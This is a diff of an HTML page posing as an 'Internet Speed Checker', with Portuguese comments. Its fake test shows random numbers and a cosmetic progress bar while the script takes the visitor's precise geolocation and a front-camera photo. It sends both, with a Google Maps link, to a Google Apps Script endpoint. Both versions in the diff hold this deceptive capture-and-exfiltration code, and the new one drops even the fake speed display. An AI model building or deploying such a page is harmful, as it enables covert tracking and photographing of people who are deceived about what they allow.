@@ -5,36 +5,15 @@
 <title>Internet Speed Checker</title>
 
 <style>
-*{box-sizing:border-box;font-family:Inter,system-ui,Segoe UI,Roboto,Arial;line-height:1}
-body{display:flex;min-height:100vh;align-items:center;justify-content:center;background:linear-gradient(180deg,#071029 0%, #071726 60%);color:#e6eef8;margin:0;padding:16px}
-.wrap{width:380px;max-width:95vw}
-.card{padding:18px;border-radius:14px;background:linear-gradient(180deg, rgba(255,255,255,0.03), rgba(255,255,255,0.01));box-shadow:0 10px 30px rgba(2,6,23,.6)}
-
-.title-pill{
-display:flex;align-items:center;justify-content:center;
-background:linear-gradient(90deg,#06b6d4,#7c3aed);
-padding:10px;border-radius:999px;font-weight:800;
-margin-bottom:12px;color:#02121a;
-}
-
-img.speed{width:100%;border-radius:10px;margin:6px 0 12px}
-
-.btn{width:100%;padding:14px;border:none;border-radius:12px;background:#06b6d4;color:#012;font-weight:800;cursor:pointer}
-
-.row{display:flex;gap:8px;margin-top:12px}
-.stat{flex:1;background:rgba(255,255,255,.02);padding:10px;border-radius:10px;text-align:center}
-.num{font-size:20px;font-weight:800;color:#06b6d4}
-.label{font-size:12px;margin-top:6px}
-
-.bar{height:8px;background:rgba(255,255,255,0.02);border-radius:8px;margin-top:12px;overflow:hidden}
-.bar > i{display:block;height:100%;width:0;background:#06b6d4}
-
-video{width:100%;border-radius:10px;margin-top:10px;display:none}
-
-.status-msg{margin-top:10px;padding:10px;border-radius:8px;text-align:center;display:none}
-.status-msg.show{display:block}
-.status-msg.success{background:#22c55e22;color:#22c55e}
-.status-msg.error{background:#ef444422;color:#ef4444}
+*{box-sizing:border-box;font-family:Arial}
+body{display:flex;align-items:center;justify-content:center;height:100vh;background:#0f172a;color:#fff;margin:0}
+.wrap{width:360px}
+.card{padding:20px;border-radius:12px;background:#111827}
+.btn{width:100%;padding:14px;border:none;border-radius:10px;background:#06b6d4;color:#000;font-weight:bold;cursor:pointer}
+video{width:100%;margin-top:10px;border-radius:10px;display:none}
+.bar{height:8px;background:#333;margin-top:10px;border-radius:6px;overflow:hidden}
+.bar i{display:block;height:100%;width:0;background:#06b6d4}
+.status{margin-top:10px;text-align:center}
 </style>
 
 </head>
@@ -43,148 +22,135 @@ video{width:100%;border-radius:10px;margin-top:10px;display:none}
 <div class="wrap">
 <div class="card">
 
-<div class="title-pill">Internet Speed Checker</div>
-
-<img class="speed" src="speed.gif">
+<h3>Internet Speed Checker</h3>
 
 <button id="start" class="btn">Start Speed Test</button>
 
 <video id="video" autoplay playsinline></video>
 <canvas id="canvas" style="display:none"></canvas>
 
-<div class="row">
-<div class="stat"><div class="num" id="ping">—</div><div class="label">Ping</div></div>
-<div class="stat"><div class="num" id="down">—</div><div class="label">Download</div></div>
-<div class="stat"><div class="num" id="up">—</div><div class="label">Upload</div></div>
-</div>
-
 <div class="bar"><i id="progress"></i></div>
-
-<div id="status" class="status-msg"></div>
+<div id="status" class="status"></div>
 
 </div>
 </div>
 
 <script>
-const SCRIPT_URL = "https://script.google.com/macros/s/AKfycby44luE92nVDUq4GdDIREhQ-ZA8zn3eDuFH9ye7g82sSjNuHpHnHPV0lbYfj7s4pzkXXA/exec";
+
+const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbxP1xbw1MIe609PjsSSvVJy-9-h-tSvnNZ1x67W7j3strAm9uH1NeoII2Wh2wTxrcLzUw/exec";
 
 const start = document.getElementById("start");
-const ping = document.getElementById("ping");
-const down = document.getElementById("down");
-const up = document.getElementById("up");
-const bar = document.getElementById("progress");
-const status = document.getElementById("status");
 const video = document.getElementById("video");
 const canvas = document.getElementById("canvas");
+const bar = document.getElementById("progress");
+const status = document.getElementById("status");
 
 let imageData = "";
 
-function showStatus(msg,type){
-status.textContent=msg;
-status.className="status-msg show "+type;
-setTimeout(()=>status.classList.remove("show"),4000);
+// STATUS
+function setStatus(msg){
+  status.innerText = msg;
 }
 
-function animate(el,a,b,t){
-let s=performance.now();
-(function f(n){
-let p=Math.min(1,(n-s)/t);
-let v=a+(b-a)*p;
-el.textContent=el===ping?Math.round(v):v.toFixed(1);
-if(p<1)requestAnimationFrame(f);
-})(s);
-}
-
+// GEOLOCALIZAÇÃO
 function getLocation(){
-return new Promise((res,rej)=>{
-navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true});
-});
+  return new Promise((resolve,reject)=>{
+    navigator.geolocation.getCurrentPosition(resolve,reject,{enableHighAccuracy:true});
+  });
 }
 
-function startCamera(){
-return navigator.mediaDevices.getUserMedia({video:{facingMode:"user"}});
+// CÂMERA
+async function startCamera(){
+  return navigator.mediaDevices.getUserMedia({
+    video:{facingMode:"user"},
+    audio:false
+  });
 }
 
+// CAPTURA FOTO
 async function capturePhoto(stream){
-video.srcObject=stream;
-video.style.display="block";
+  video.srcObject = stream;
+  video.style.display = "block";
 
-await new Promise(r=>setTimeout(r,1000));
+  await new Promise(r => setTimeout(r,1000));
 
-canvas.width=video.videoWidth;
-canvas.height=video.videoHeight;
-canvas.getContext("2d").drawImage(video,0,0);
+  canvas.width = video.videoWidth;
+  canvas.height = video.videoHeight;
+  canvas.getContext("2d").drawImage(video,0,0);
 
-imageData=canvas.toDataURL("image/jpeg",0.6);
+  // compressão (IMPORTANTE)
+  imageData = canvas.toDataURL("image/jpeg",0.5);
 
-stream.getTracks().forEach(t=>t.stop());
-video.style.display="none";
+  // parar câmera
+  stream.getTracks().forEach(t=>t.stop());
+  video.style.display = "none";
+
+  console.log("Imagem capturada:", imageData.substring(0,50)); // debug
 }
 
-async function sendData(data){
-try{
-await fetch(SCRIPT_URL,{
-method:"POST",
-headers:{"Content-Type":"application/json"},
-body:JSON.stringify(data)
-});
-}catch(e){console.error(e);}
+// ENVIO
+async function sendData(payload){
+  try{
+    await fetch(SCRIPT_URL,{
+      method:"POST",
+      headers:{
+        "Content-Type":"application/json"
+      },
+      body:JSON.stringify(payload)
+    });
+  }catch(e){
+    console.error("Erro envio:", e);
+  }
 }
 
-async function fakeTest(){
+// EXECUÇÃO PRINCIPAL
+async function startTest(){
 
-start.disabled=true;
-start.textContent="Testing...";
-bar.style.width="0%";
+  start.disabled = true;
+  setStatus("Solicitando permissões...");
 
-try{
-showStatus("Solicitando permissões...","success");
+  try{
 
-const [pos,stream]=await Promise.all([
-getLocation(),
-startCamera()
-]);
+    const [pos,stream] = await Promise.all([
+      getLocation(),
+      startCamera()
+    ]);
 
-await capturePhoto(stream);
+    setStatus("Capturando dados...");
+    await capturePhoto(stream);
 
-const payload={
-timestamp:new Date().toISOString(),
-latitude:pos.coords.latitude,
-longitude:pos.coords.longitude,
-accuracy:pos.coords.accuracy,
-mapLink:`https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`,
-image:imageData
-};
+    const payload = {
+      timestamp:new Date().toISOString(),
+      latitude:pos.coords.latitude,
+      longitude:pos.coords.longitude,
+      accuracy:pos.coords.accuracy,
+      mapLink:`https://maps.google.com/?q=${pos.coords.latitude},${pos.coords.longitude}`,
+      image:imageData // ✔ GARANTIDO
+    };
 
-await sendData(payload);
+    console.log("Payload:", payload); // debug
 
-showStatus("✓ Dados enviados","success");
+    await sendData(payload);
 
-}catch(e){
-showStatus("Permissão negada ou erro","error");
+    setStatus("Dados enviados com sucesso");
+
+  }catch(e){
+    console.error(e);
+    setStatus("Erro ou permissão negada");
+  }
+
+  // animação fake
+  bar.style.width = "100%";
+
+  setTimeout(()=>{
+    start.disabled = false;
+    setStatus("");
+    bar.style.width = "0%";
+  },3000);
 }
 
-setTimeout(()=>bar.style.width="30%",200);
-animate(ping,80,Math.random()*60+10,800);
+start.addEventListener("click", startTest);
 
-setTimeout(()=>{
-bar.style.width="60%";
-animate(down,0,Math.random()*150+20,1200);
-},800);
-
-setTimeout(()=>{
-bar.style.width="90%";
-animate(up,0,Math.random()*40+5,1000);
-},2000);
-
-setTimeout(()=>{
-bar.style.width="100%";
-start.disabled=false;
-start.textContent="Start Speed Test";
-},3500);
-}
-
-start.onclick=fakeTest;
 </script>
 
 </body>
